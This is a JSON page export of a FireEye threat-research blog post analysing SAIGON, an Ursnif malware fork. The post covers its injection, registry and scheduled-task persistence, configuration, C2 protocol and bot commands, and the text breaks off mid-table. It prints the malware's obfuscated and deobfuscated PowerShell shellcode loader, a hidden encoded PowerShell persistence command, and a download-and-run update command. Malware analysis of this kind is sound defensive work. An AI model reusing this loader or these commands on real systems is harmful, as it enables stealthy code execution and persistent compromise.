{
  "jcr:primaryType": "cq:Page",
  "jcr:createdBy": "fireeye_global_admin",
  "jcr:created": "Thu Jan 09 2020 17:30:47 GMT+0000",
  "jcr:content": {
    "jcr:primaryType": "cq:PageContent",
    "jcr:mixinTypes": [
      "mix:versionable"
    ],
    "jcr:createdBy": "fireeye_global_admin",
    "jcr:title": "SAIGON, the Mysterious Ursnif Fork",
    "jcr:versionHistory": "640bf1de-f22b-41bc-af04-07b3c443080d",
    "author": "Sandor Nemes",
    "cq:template": "\/apps\/fireeye-blog\/templates\/page_blogpost",
    "jcr:language": "en_us",
    "jcr:predecessors": [
      "c529ca69-2c47-4d53-8cd1-c153c47c7f38"
    ],
    "jcr:created": "Thu Jan 09 2020 17:30:47 GMT+0000",
    "cq:lastModified": "Thu Jan 09 2020 17:28:29 GMT+0000",
    "jcr:baseVersion": "c529ca69-2c47-4d53-8cd1-c153c47c7f38",
    "jcr:isCheckedOut": true,
    "cq:tags": [
      "fireeye-blog-authors:sandor-nemes",
      "fireeye-blog-authors:zander-work",
      "fireeye-blog-threat-research:threat-research",
      "fireeye-blog-tags:cybercrime",
      "fireeye-blog-tags:homepage-carousel",
      "fireeye-blog-tags:latest",
      "fireeye-blog-tags:malware",
      "fireeye-blog-tags:financial-industry"
    ],
    "jcr:uuid": "309f2302-1b2c-4da5-bd7c-ed8398bd4e12",
    "sling:resourceType": "social\/blog\/components\/page",
    "published": "Thu Jan 09 2020 12:30:00 GMT-0500",
    "cq:lastModifiedBy": "adam.greenberg@fireeye.com",
    "par": {
      "jcr:primaryType": "nt:unstructured",
      "sling:resourceType": "foundation\/components\/parsys",
      "entry": {
        "jcr:primaryType": "nt:unstructured",
        "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
        "text": "\u003Cp\u003EUrsnif (aka Gozi\/Gozi-ISFB) is one of the oldest banking malware families still in active distribution. While the first major version of Ursnif was identified in 2006, several subsequent versions have been released in large part due source code leaks. FireEye reported on a previously unidentified variant of the Ursnif malware family to our \u003Ca href=\u0022https:\/\/www.fireeye.com\/solutions\/cyber-threat-intelligence\/threat-intelligence-subscriptions.html\u0022\u003Ethreat intelligence subscribers\u003C\/a\u003E in September 2019 after identification of a server that hosted a collection of tools, which included multiple point-of-sale malware families. This malware self-identified as \u0026quot;SaiGon version 3.50 rev 132,\u0026quot; and our analysis suggests it is likely based on the source code of the v3 (RM3) variant of Ursnif. Notably, rather than being a full-fledged banking malware, SAIGON\u0027s capabilities suggest it is a more generic backdoor, perhaps tailored for use in targeted cybercrime operations.\u003C\/p\u003E\n\u003Ch4\u003ETechnical Analysis\u003C\/h4\u003E\n\u003Ch5\u003EBehavior\u003C\/h5\u003E\n\u003Cp\u003ESAIGON appears on an infected computer as a Base64-encoded shellcode blob stored in a registry key, which is launched using PowerShell via a scheduled task. As with other Ursnif variants, the main component of the malware is a DLL file. This DLL has a single exported function, \u003Ci\u003EDllRegisterServer\u003C\/i\u003E, which is an unused empty function. All the relevant functionality of the malware executes when the DLL is loaded and initialized via its entry point.\u003C\/p\u003E\n\u003Cp\u003EUpon initial execution, the malware generates a machine ID using the creation timestamp of either \u003Ci\u003E%SystemDrive%\\pagefile.sys\u003C\/i\u003E or \u003Ci\u003E%SystemDrive%\\hiberfil.sys\u003C\/i\u003E (whichever is identified first). Interestingly, the system drive is queried in a somewhat uncommon way, directly from the \u003Ci\u003EKUSER_SHARED_DATA\u003C\/i\u003E structure (via \u003Ci\u003ESharedUserData\u2192NtSystemRoot\u003C\/i\u003E). \u003Ci\u003EKUSER_SHARED_DATA\u003C\/i\u003E is a structure located in a special part of kernel memory that is mapped into the memory space of all user-mode processes (thus shared), and always located at a fixed memory address\u003Ci\u003E (0x7ffe0000\u003C\/i\u003E, pointed to by the \u003Ci\u003ESharedUserData \u003C\/i\u003Esymbol).\u003C\/p\u003E\n\u003Cp\u003EThe code then looks for the current shell process by using a call to \u003Ci\u003EGetWindowThreadProcessId(GetShellWindow(), \u2026)\u003C\/i\u003E. The code also features a special check; if the checksum calculated from the name of the shell\u0027s parent process matches the checksum of \u003Ci\u003Eexplorer.exe\u003C\/i\u003E (\u003Ci\u003E0xc3c07cf0\u003C\/i\u003E), it will attempt to inject into the parent process instead.\u003C\/p\u003E\n\u003Cp\u003ESAIGON then injects into this process using the classic \u003Ci\u003EVirtualAllocEx \/ WriteProcessMemory \/ CreateRemoteThread\u003C\/i\u003E combination of functions. Once this process is injected, it loads two embedded files from within its binary:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EA \u003Ci\u003EPUBLIC.KEY\u003C\/i\u003E file, which is used to verify and decrypt other embedded files and data coming from the malware\u0027s command and control (C2) server\u003C\/li\u003E\n\u003Cli\u003EA \u003Ci\u003ERUN.PS1 \u003C\/i\u003Efile, which is a PowerShell loader script template that contains a \u0026quot;\u003Ci\u003E@SOURCE@\u003C\/i\u003E\u0026quot; placeholder within the script:\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E$hanksefksgu = [System.Convert]::FromBase64String(\u0026quot;@SOURCE@\u0026quot;);\u003Cbr\u003E\nInvoke-Expression ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\u0026quot;JHdneG1qZ2J4dGo9JGh\u003Cbr\u003E\nhbmtzZWZrc2d1Lkxlbmd0aDskdHNrdm89IltEbGxJbXBvcnQoYCJrZXJuZWwzMmAiKV1gbnB1YmxpYyBzdGF\u003Cbr\u003E\n0aWMgZXh0ZXJuIEludDMyIEdldEN1cnJlbnRQcm9jZXNzKCk7YG5bRGxsSW1wb3J0KGAidXNlcjMyYCIpXWB\u003Cbr\u003E\nucHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldERDKEludFB0ciBteHhhaHhvZik7YG5bRGxsSW1wb3J0K\u003Cbr\u003E\nGAia2VybmVsMzJgIildYG5wdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlUmVtb3RlVGhyZWFkKEl\u003Cbr\u003E\nudFB0ciBoY3d5bHJicywgSW50UHRyIHdxZXIsdWludCBzZmosSW50UHRyIHdsbGV2LEludFB0ciB3d2RyaWN\u003Cbr\u003E\n0d2RrLHVpbnQga2xtaG5zayxJbnRQdHIgdmNleHN1YWx3aGgpO2BuW0RsbEltcG9ydChgImtlcm5lbDMyYCI\u003Cbr\u003E\npXWBucHVibGljIHN0YXRpYyBleHRlcm4gVUludDMyIFdhaXRGb3JTaW5nbGVPYmplY3QoSW50UHRyIGFqLC\u003Cbr\u003E\nBVSW50MzIga2R4c3hldik7YG5bRGxsSW1wb3J0KGAia2VybmVsMzJgIildYG5wdWJsaWMgc3RhdGljIGV4dG\u003Cbr\u003E\nVybiBJbnRQdHIgVmlydHVhbEFsbG9jKEludFB0ciB4eSx1aW50IGtuYnQsdWludCB0bXJ5d2h1LHVpbnQgd2d1\u003Cbr\u003E\ndHVkKTsiOyR0c2thYXhvdHhlPUFkZC1UeXBlIC1tZW1iZXJEZWZpbml0aW9uICR0c2t2byAtTmFtZSAnV2luMzI\u003Cbr\u003E\nnIC1uYW1lc3BhY2UgV2luMzJGdW5jdGlvbnMgLXBhc3N0aHJ1OyRtaHhrcHVsbD0kdHNrYWF4b3R4ZTo6Vml\u003Cbr\u003E\nydHVhbEFsbG9jKDAsJHdneG1qZ2J4dGosMHgzMDAwLDB4NDApO1tTeXN0ZW0uUnVudGltZS5JbnRlcm9wU\u003Cbr\u003E\n2VydmljZXMuTWFyc2hhbF06OkNvcHkoJGhhbmtzZWZrc2d1LDAsJG1oeGtwdWxsLCR3Z3htamdieHRqKTskd\u003Cbr\u003E\nGRvY25ud2t2b3E9JHRza2FheG90eGU6OkNyZWF0ZVJlbW90ZVRocmVhZCgtMSwwLDAsJG1oeGtwdWxsLC\u003Cbr\u003E\nRtaHhrcHVsbCwwLDApOyRvY3h4am1oaXltPSR0c2thYXhvdHhlOjpXYWl0Rm9yU2luZ2xlT2JqZWN0KCR0ZG\u003Cbr\u003E\n9jbm53a3ZvcSwzMDAwMCk7\u0026quot;)));\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EThe malware replaces the \u0026quot;\u003Ci\u003E@SOURCE@\u003C\/i\u003E\u0026quot; placeholder from this PowerShell script template with a Base64-encoded version of itself, and writes the PowerShell script to a registry value named \u0026quot;\u003Ci\u003EPsRun\u003C\/i\u003E\u0026quot; under the \u0026quot;\u003Ci\u003EHKEY_CURRENT_USER\\Identities\\{\u0026lt;random_guid\u0026gt;}\u003C\/i\u003E\u0026quot; registry key (Figure 1).\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/saigon\/Picture1.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 1: PowerShell script written to \u003Ci\u003EPsRun\u003C\/i\u003E\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe instance of SAIGON then creates a new scheduled task (Figure 2) with the name \u0026quot;\u003Ci\u003EPower\u0026lt;random_word\u0026gt;\u003C\/i\u003E\u0026quot; (e.g. \u003Ci\u003EPowerSgs\u003C\/i\u003E). If this is unsuccessful for any reason, it falls back to using the \u0026quot;\u003Ci\u003EHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u003C\/i\u003E\u0026quot; registry key to enable itself to maintain persistence through system reboot.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/saigon\/Picture2.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 2: Scheduled task\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003ERegardless of the persistence mechanism used, the command that executes the binary from the registry is similar to the following:\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EPowerShell.exe -windowstyle hidden -ec aQBlAHgAIAAoAGcAcAAgACcASABLAEMAVQA6AFwASQBkAGUAbgB0AGkAdABpAGUAcwBcAHsANAAzAEIA\u003Cbr\u003E\nOQA1AEUANQBCAC0ARAAyADEAOAAtADAAQQBCADgALQA1AEQANwBGAC0AMgBDADcAOAA5AEMANQA5\u003Cbr\u003E\nAEIAMQBEAEYAfQAnACkALgBQAHMAUgB1AG4A\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EAfter removing the Base64 encoding from this command, it looks something like \u0026quot;\u003Ci\u003Eiex (gp \u0027HKCU:\\\\Identities\\\\{43B95E5B-D218-0AB8-5D7F-2C789C59B1DF}\u0027).PsRun.\u003C\/i\u003E\u0026quot;\u003Ci\u003E \u003C\/i\u003E\u0026nbsp;When executed, this command retrieves the contents of the previous registry value using \u003Ci\u003EGet-ItemProperty\u003C\/i\u003E (\u003Ci\u003Egp\u003C\/i\u003E) and executes it using \u003Ci\u003EInvoke-Expression\u003C\/i\u003E (\u003Ci\u003Eiex\u003C\/i\u003E).\u003C\/p\u003E\n\u003Cp\u003EFinally, the PowerShell code in the registry allocates a block of memory, copies the Base64-decoded shellcode blob into it, launches a new thread pointing to the area using \u003Ci\u003ECreateRemoteThread\u003C\/i\u003E, and waits for the thread to complete. The following script is a deobfuscated and beautified version of the PowerShell.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E$hanksefksgu = [System.Convert]::FromBase64String(\u0026quot;@SOURCE@\u0026quot;);\u003Cbr\u003E\n$wgxmjgbxtj = $hanksefksgu.Length;\u003C\/p\u003E\n\u003Cp\u003E$tskvo = @\u0026quot;\u003Cbr\u003E\n[DllImport(\u0026quot;kernel32\u0026quot;)]\u003Cbr\u003E\npublic static extern Int32 GetCurrentProcess();\u003C\/p\u003E\n\u003Cp\u003E[DllImport(\u0026quot;user32\u0026quot;)]\u003Cbr\u003E\npublic static extern IntPtr GetDC(IntPtr mxxahxof);\u003C\/p\u003E\n\u003Cp\u003E[DllImport(\u0026quot;kernel32\u0026quot;)]\u003Cbr\u003E\npublic static extern IntPtr CreateRemoteThread(IntPtr hcwylrbs, IntPtr wqer, uint sfj, IntPtr wllev, IntPtr wwdrictwdk, uint klmhnsk, IntPtr vcexsualwhh);\u003C\/p\u003E\n\u003Cp\u003E[DllImport(\u0026quot;kernel32\u0026quot;)]\u003Cbr\u003E\npublic static extern UInt32 WaitForSingleObject(IntPtr aj, UInt32 kdxsxev);\u003C\/p\u003E\n\u003Cp\u003E[DllImport(\u0026quot;kernel32\u0026quot;)]\u003Cbr\u003E\npublic static extern IntPtr VirtualAlloc(IntPtr xy, uint knbt, uint tmrywhu, uint wgutud);\u003Cbr\u003E\n\u0026quot;@;\u003C\/p\u003E\n\u003Cp\u003E$tskaaxotxe = Add-Type -memberDefinition $tskvo -Name \u0027Win32\u0027 -namespace Win32Functions -passthru;\u003Cbr\u003E\n$mhxkpull = $tskaaxotxe::VirtualAlloc(0, $wgxmjgbxtj, 0x3000, 0x40);[System.Runtime.InteropServices.Marshal]::Copy($hanksefksgu, 0, $mhxkpull, $wgxmjgbxtj);\u003Cbr\u003E\n$tdocnnwkvoq = $tskaaxotxe::CreateRemoteThread(-1, 0, 0, $mhxkpull, $mhxkpull, 0, 0);\u003Cbr\u003E\n$ocxxjmhiym = $tskaaxotxe::WaitForSingleObject($tdocnnwkvoq, 30000);\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EOnce it has established a foothold on the machine, SAIGON loads and parses its embedded \u003Ci\u003ELOADER.INI\u003C\/i\u003E configuration (see the Configuration section for details) and starts its main worker thread, which continuously polls the C2 server for commands.\u003C\/p\u003E\n\u003Ch5\u003EConfiguration\u003C\/h5\u003E\n\u003Cp\u003EThe Ursnif source code incorporated a concept referred to as \u0026quot;joined data,\u0026quot; which is a set of compressed\/encrypted files bundled with the executable file. Early variants relied on a special structure after the PE header and marked with specific magic bytes (\u0026quot;\u003Ci\u003EJF,\u003C\/i\u003E\u0026quot; \u0026quot;\u003Ci\u003EFJ,\u003C\/i\u003E\u0026quot; \u0026quot;\u003Ci\u003EJ1,\u003C\/i\u003E\u0026quot; \u0026quot;\u003Ci\u003EJJ,\u003C\/i\u003E\u0026quot; depending on the Ursnif version). In Ursnif v3 (Figure 3), this data is no longer simply after the PE header but pointed to by the Security Directory in the PE header, and the magic bytes have also been changed to \u0026quot;\u003Ci\u003EWD\u003C\/i\u003E\u0026quot; (\u003Ci\u003E0x4457\u003C\/i\u003E).\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/saigon\/Figure%203a.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 3: Ursnif v3 joined data\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThis structure defines the various properties (offset, size, and type) of the bundled files. This is the same exact method used by SAIGON for storing its three embedded files:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ci\u003EPUBLIC.KEY\u003C\/i\u003E - RSA public key\u003C\/li\u003E\n\u003Cli\u003E\u003Ci\u003ERUN.PS1\u003C\/i\u003E - PowerShell script template\u003C\/li\u003E\n\u003Cli\u003E\u003Ci\u003ELOADER.INI - \u003C\/i\u003EMalware configuration\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EThe following is a list of configuration options observed:\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022631\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022103\u0022\u003E\u003Cp\u003E\u003Cb\u003EName Checksum\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022134\u0022\u003E\u003Cp\u003E\u003Cb\u003EName\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022394\u0022\u003E\u003Cp\u003E\u003Cb\u003EDescription\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022103\u0022\u003E\u003Cp\u003E\u003Ci\u003E0x97ccd204\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022134\u0022\u003E\u003Cp\u003E\u003Ci\u003EHostsList\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022394\u0022\u003E\u003Cp\u003EList of C2 URLs used for communication\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022103\u0022\u003E\u003Cp\u003E\u003Ci\u003E0xd82bcb60\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022134\u0022\u003E\u003Cp\u003E\u003Ci\u003EServerKey\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022394\u0022\u003E\u003Cp\u003ESerpent key used for communicating with the C2\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022103\u0022\u003E\u003Cp\u003E\u003Ci\u003E0x23a02904\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022134\u0022\u003E\u003Cp\u003E\u003Ci\u003EGroup\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022394\u0022\u003E\u003Cp\u003EBotnet ID\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022103\u0022\u003E\u003Cp\u003E\u003Ci\u003E0x776c71c0\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022134\u0022\u003E\u003Cp\u003E\u003Ci\u003EIdlePeriod\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022394\u0022\u003E\u003Cp\u003ENumber of seconds to wait before the initial request to the C2\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022103\u0022\u003E\u003Cp\u003E\u003Ci\u003E0x22aa2818\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022134\u0022\u003E\u003Cp\u003E\u003Ci\u003EMinimumUptime\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022394\u0022\u003E\u003Cp\u003EWaits until the uptime is greater than this value (in seconds)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022103\u0022\u003E\u003Cp\u003E\u003Ci\u003E0x5beb543e\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022134\u0022\u003E\u003Cp\u003E\u003Ci\u003ELoadPeriod\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022394\u0022\u003E\u003Cp\u003ENumber of seconds to wait between subsequent requests to the C2\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022103\u0022\u003E\u003Cp\u003E\u003Ci\u003E0x84485ef2\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022134\u0022\u003E\u003Cp\u003E\u003Ci\u003EHostKeepTime\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022394\u0022\u003E\u003Cp\u003EThe number of minutes to wait before switching to the next C2 server in case of failures\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003ETable 1: Configuration options\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch5\u003ECommunication\u003C\/h5\u003E\n\u003Cp\u003EWhile the network communication structure of SAIGON is very similar to Ursnif v3, there are some subtle differences. SAIGON beacons are sent to the C2 servers as multipart\/form-data encoded requests via HTTP POST to the \u0026quot;\u003Ci\u003E\/index.html\u003C\/i\u003E\u0026quot; URL path. The payload to be sent is first encrypted using Serpent encryption (in ECB mode vs CBC mode), then Base64-encoded. Responses from the server are encrypted with the same Serpent key and signed with the server\u0027s RSA private key.\u003C\/p\u003E\n\u003Cp\u003ESAIGON uses the following User-Agent header in its HTTP requests: \u0026quot;\u003Ci\u003EMozilla\/5.0 (Windows NT \u0026lt;os_version\u0026gt;; rv:58.0) Gecko\/20100101 Firefox\/58.0,\u003C\/i\u003E\u0026quot; where \u003Ci\u003E\u0026lt;os_version\u0026gt;\u003C\/i\u003E consists of the operating system\u0027s major and minor version number (e.g. 10.0 on Windows 10, and 6.1 on Windows 7) and the string \u0026quot;\u003Ci\u003E; Win64; x64\u003C\/i\u003E\u0026quot; is appended when the operating system is 64-bit. This yields the following example User Agent strings:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u0026quot;\u003Ci\u003EMozilla\/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko\/20100101 Firefox\/58.0\u003C\/i\u003E\u0026quot; on Windows 10 64-bit\u003C\/li\u003E\n\u003Cli\u003E\u0026quot;\u003Ci\u003EMozilla\/5.0 (Windows NT 6.1; rv:58.0) Gecko\/20100101 Firefox\/58.0\u003C\/i\u003E\u0026quot; on Windows 7 32-bit\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EThe request format is also somewhat similar to the one used by other Ursnif variants described in Table 2:\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ever=%u\u0026amp;group=%u\u0026amp;id=%08x%08x%08x%08x\u0026amp;type=%u\u0026amp;uptime=%u\u0026amp;knock=%u\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022631\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u002269\u0022\u003E\u003Cp\u003E\u003Cb\u003EName\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022562\u0022\u003E\u003Cp\u003E\u003Cb\u003EDescription\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002269\u0022\u003E\u003Cp\u003E\u003Ci\u003Ever\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022562\u0022\u003E\u003Cp\u003EBot version (unlike other Ursnif variants this only contains the build number, so only the xxx digits from \u0026quot;3.5.xxx\u0026quot;)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002269\u0022\u003E\u003Cp\u003E\u003Ci\u003Egroup\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022562\u0022\u003E\u003Cp\u003EBotnet ID\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002269\u0022\u003E\u003Cp\u003E\u003Ci\u003Eid\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022562\u0022\u003E\u003Cp\u003EClient ID\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002269\u0022\u003E\u003Cp\u003E\u003Ci\u003Etype\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022562\u0022\u003E\u003Cp\u003ERequest type (0 \u2013 when polling for tasks, 6 \u2013 for system info data uploads)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002269\u0022\u003E\u003Cp\u003E\u003Ci\u003Euptime\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022562\u0022\u003E\u003Cp\u003EMachine uptime in seconds\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002269\u0022\u003E\u003Cp\u003E\u003Ci\u003Eknock\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022562\u0022\u003E\u003Cp\u003EThe bot \u0026quot;knock\u0026quot; period (number of seconds to wait between subsequent requests to the C2, see the LoadPeriod configuration option)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003ETable 2: Request format components\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch5\u003ECapabilities\u003C\/h5\u003E\n\u003Cp\u003ESAIGON implements the bot commands described in Table 3.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022631\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022101\u0022\u003E\u003Cp\u003E\u003Cb\u003EName Checksum\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022120\u0022\u003E\u003Cp\u003E\u003Cb\u003EName\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022410\u0022\u003E\u003Cp\u003E\u003Cb\u003EDescription\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022101\u0022\u003E\u003Cp\u003E\u003Ci\u003E0x45d4bf54\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022120\u0022\u003E\u003Cp\u003E\u003Ci\u003ESELF_DELETE\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022410\u0022\u003E\u003Cp\u003EUninstalls itself from the machine; removes scheduled task and deletes its registry key\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022101\u0022\u003E\u003Cp\u003E\u003Ci\u003E0xd86c3bdc\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022120\u0022\u003E\u003Cp\u003E\u003Ci\u003ELOAD_UPDATE\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022410\u0022\u003E\u003Cp\u003EDownload data from URL, decrypt and verify signature, save it as a \u003Ci\u003E.ps1\u003C\/i\u003E file and run it using \u0026quot;\u003Ci\u003EPowerShell.exe -ep unrestricted -file %s\u003C\/i\u003E\u0026quot;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022101\u0022\u003E\u003Cp\u003E\u003Ci\u003E0xeac44e42\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022120\u0022\u003E\u003Cp\u003E\u003Ci\u003EGET_SYSINFO\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022410\u0022\u003E\u003Cp\u003ECollects and uploads system information by running:\u003C\/p\u003E\n\u003Col\u003E\n\u003Cli\u003E\u0026quot;\u003Ci\u003Esysteminfo.exe\u003C\/i\u003E\u0026quot;\u003C\/li\u003E\n\u003Cli\u003E\u0026quot;\u003Ci\u003Enet view\u003C\/i\u003E\u0026quot;\u003C\/li\u003E\n\u003Cli\u003E\u0026quot;\u003Ci\u003Enslookup 127.0.0.1\u003C\/i\u003E\u0026quot;\u003C\/li\u003E\n\u003Cli\u003E\u0026quot;\u003Ci\u003Etasklist.exe \/SVC\u003C\/i\u003E\u0026quot;\u003C\/li\u003E\n\u003Cli\u003E\u0026quot;\u003Ci\u003Edriverquery.exe\u003C\/i\u003E\u0026quot;\u003C\/li\u003E\n\u003Cli\u003E\u0026quot;\u003Ci\u003Ereg.exe query \u003C\/i\u003E\u0026quot;\u003Ci\u003EHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\u003C\/i\u003E\u0026quot;\u003Ci\u003E 